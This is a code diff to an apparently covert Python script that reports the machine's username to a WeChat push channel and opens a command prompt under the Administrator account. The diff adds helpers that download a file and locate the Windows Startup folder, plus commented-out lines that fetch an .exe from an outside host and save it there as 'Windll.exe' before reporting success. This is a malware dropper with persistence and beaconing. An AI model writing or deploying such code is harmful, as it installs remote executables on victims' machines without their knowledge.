@@ -93,8 +93,29 @@ def start_cmd(ml):
     except Exception as e:
         print(f"发生错误: {e}")
         wechat_push.Alleged_information(f"发生错误: {e}")
+# 定义下载函数
+def download_file(_url, _save_path):
+    response = requests.get(_url, stream=True)
+    with open(_save_path, 'wb') as f:
+        for chunk in response.iter_content(chunk_size=8192):
+            f.write(chunk)
 
+# 获取Windows启动文件夹路径
+def get_startup_folder_path():
+    # 获取当前用户的用户名
+    username = os.getlogin()
+    # 构建启动文件夹路径
+    startup_folder_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    return startup_folder_path
 # ===================干活====================
 if sys_username == 'Administrator':
     start_cmd('start cmd')
-wechat_push.Alleged_information(f'{sys_username}联系中')
+wechat_push.Alleged_information(f'{sys_username}可以')
+
+# url = "https://cccimg.com/down.php/3d961495fa0bd4c7be0e4d8740a699f8.exe"
+# startup_folder_path = get_startup_folder_path()
+# file_name = "Windll.exe"  # 你需要指定文件名
+# save_path = os.path.join(startup_folder_path, file_name)
+# download_file(url, save_path)
+# wechat_push.Alleged_information(f'{sys_username}ok')
+
